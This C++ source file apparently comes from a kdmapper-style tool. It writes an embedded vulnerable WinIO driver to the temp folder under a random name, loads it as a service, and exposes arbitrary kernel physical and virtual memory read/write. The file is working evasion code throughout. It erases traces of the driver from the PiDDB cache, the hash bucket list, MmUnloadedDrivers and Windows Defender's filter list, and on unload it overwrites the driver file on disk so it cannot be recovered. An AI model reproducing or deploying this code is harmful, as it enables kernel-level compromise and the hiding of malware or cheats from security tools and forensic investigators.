#include "winio.hpp"
#include "intel_driver.hpp"
#include "drv_utils.hpp"

char winio_driver::driver_name[100] = {};

std::wstring winio_driver::GetDriverNameW() {
	std::string t(winio_driver::driver_name);
	std::wstring name(t.begin(), t.end());
	return name;
}

std::wstring winio_driver::GetDriverPath() {
	std::wstring temp = utils::GetFullTempPath();
	if (temp.empty()) {
		return L"";
	}
	return temp + L"\\" + GetDriverNameW();
}

bool winio_driver::IsRunning()
{
	const HANDLE file_handle = CreateFileW(L"\\\\.\\WINIO", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
	{
		CloseHandle(file_handle);
		return true;
	}
	return false;
}

HANDLE winio_driver::Load(HANDLE intel_handle)
{
	srand((unsigned)time(NULL) * GetCurrentThreadId() + 0x69);

	if (winio_driver::IsRunning()) {
		Log(L"[-] \\Device\\WINIO is already in use." << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	//Randomize name for log in registry keys, usn jornal and other shits
	memset(winio_driver::driver_name, 0, sizeof(winio_driver::driver_name));
	static const char alphanum[] =
		"abcdefghijklmnopqrstuvwxyz"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	int len = rand() % 20 + 10;
	for (int i = 0; i < len; ++i)
		winio_driver::driver_name[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

	Log(L"[<] Loading vulnerable driver, Name: " << GetDriverNameW() << std::endl);

	std::wstring driver_path = GetDriverPath();
	if (driver_path.empty()) {
		Log(L"[-] Can't find TEMP folder" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	_wremove(driver_path.c_str());

	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(winio_driver_resource::driver), sizeof(winio_driver_resource::driver))) {
		Log(L"[-] Failed to create vulnerable driver file" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	if (!service::RegisterAndStart(driver_path, GetDriverNameW())) {
		Log(L"[-] Failed to register and start service for the vulnerable driver" << std::endl);
		_wremove(driver_path.c_str());
		return INVALID_HANDLE_VALUE;
	}

	HANDLE result = CreateFileW(L"\\\\.\\WINIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!result || result == INVALID_HANDLE_VALUE)
	{
		Log(L"[-] Failed to load driver WINIO64.sys" << std::endl);
		winio_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (intel_driver::ntoskrnlAddr == 0) {
		Log(L"[-] Failed to get ntoskrnl.exe" << std::endl);
		winio_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearPiDDBCacheTable(intel_handle, winio_driver::winio_timestamp, GetDriverNameW())) {
		Log(L"[-] Failed to ClearPiDDBCacheTable" << std::endl);
		winio_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearKernelHashBucketList(intel_handle, GetDriverNameW(), GetDriverPath())) {
		Log(L"[-] Failed to ClearKernelHashBucketList" << std::endl);
		winio_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearMmUnloadedDrivers(intel_handle, result)) {
		Log(L"[!] Failed to ClearMmUnloadedDrivers" << std::endl);
		winio_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearWdFilterDriverList(intel_handle, GetDriverNameW())) {
		Log("[!] Failed to ClearWdFilterDriverList" << std::endl);
		winio_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	return result;
}

bool winio_driver::Unload(HANDLE device_handle)
{
	Log(L"[<] Unloading vulnerable driver" << std::endl);

	if (device_handle && device_handle != INVALID_HANDLE_VALUE) {
		CloseHandle(device_handle);
	}

	if (!service::StopAndRemove(GetDriverNameW()))
		return false;

	std::wstring driver_path = GetDriverPath();

	//Destroy disk information before unlink from disk to prevent any recover of the file
	std::ofstream file_ofstream(driver_path.c_str(), std::ios_base::out | std::ios_base::binary);
	int newFileLen = sizeof(intel_driver_resource::driver) + (((long long)rand() * (long long)rand()) % 2000000 + 1000);
	BYTE* randomData = new BYTE[newFileLen];
	for (size_t i = 0; i < newFileLen; i++) {
		randomData[i] = (BYTE)(rand() % 255);
	}
	if (!file_ofstream.write((char*)randomData, newFileLen)) {
		Log(L"[!] Error dumping shit inside the disk" << std::endl);
	}
	else {
		Log(L"[+] Vul driver data destroyed before unlink" << std::endl);
	}
	file_ofstream.close();
	delete[] randomData;

	//unlink the file
	if (_wremove(driver_path.c_str()) != 0)
		return false;

	return true;
}

uint8_t* winio_driver::MapPhysicalMemory(HANDLE driver_handle, uint64_t physAddr, size_t size, winio_mem& mem)
{
	if (INVALID_HANDLE_VALUE != driver_handle)
	{
		memset(&mem, 0, sizeof(winio_mem));
		mem.addr = physAddr;
		mem.size = size;
		DWORD retSize;
		BOOL r = DeviceIoControl(driver_handle, IOCTL_MAPMEM, &mem, sizeof(winio_mem), &mem, sizeof(winio_mem), &retSize, 0);
		if (r)
			return (uint8_t*)mem.outPtr;
	}
	return nullptr;
}

void winio_driver::UnmapPhysicalMemory(HANDLE driver_handle, winio_mem& mem)
{
	if (INVALID_HANDLE_VALUE != driver_handle)
	{
		DWORD retSize;
		DeviceIoControl(driver_handle, IOCTL_UNMAPMEM, &mem, sizeof(winio_mem), 0, 0, &retSize, 0);
	}
}

bool winio_driver::ReadPhysicalMemory(HANDLE driver_handle, uint64_t physAddress, uint8_t* buffer, size_t size)
{
	if (INVALID_HANDLE_VALUE != driver_handle)
	{
		winio_mem mem;
		uint8_t* tmp = MapPhysicalMemory(driver_handle, physAddress, size, mem);
		if (nullptr != tmp)
		{
			memcpy(buffer, tmp, size);
			UnmapPhysicalMemory(driver_handle, mem);
			return true;
		}
	}
	return false;
}

bool winio_driver::WritePhysicalMemory(HANDLE driver_handle, uint64_t physAddress, uint8_t* buffer, size_t size)
{
	if (INVALID_HANDLE_VALUE != driver_handle)
	{
		winio_mem mem;
		uint8_t* tmp = MapPhysicalMemory(driver_handle, physAddress, size, mem);
		if (nullptr != tmp)
		{
			memcpy(tmp, buffer, size);
			UnmapPhysicalMemory(driver_handle, mem);
			return true;
		}
	}
	return false;
}

bool winio_driver::ReadVirtualMemory(HANDLE driver_handle, uint64_t virtual_address, uint8_t* buffer, size_t size, uintptr_t dtb)
{
	if (!virtual_address)
		return false;

	if (!size)
		return false;

	uintptr_t physical_address = drv_utils::convert_virtual_to_physical(driver_handle, virtual_address, dtb);

	if (!physical_address)
		return false;

	ReadPhysicalMemory(driver_handle, physical_address, buffer, size);
	return true;
}

bool winio_driver::WriteVirtualMemory(HANDLE driver_handle, uint64_t virtual_address, uint8_t* buffer, size_t size, uintptr_t dtb)
{
	if (!virtual_address)
		return false;

	if (!size)
		return false;

	uintptr_t physical_address = drv_utils::convert_virtual_to_physical(driver_handle, virtual_address, dtb);

	if (!physical_address)
		return false;

	WritePhysicalMemory(driver_handle, physical_address, buffer, size);
	return true;
}
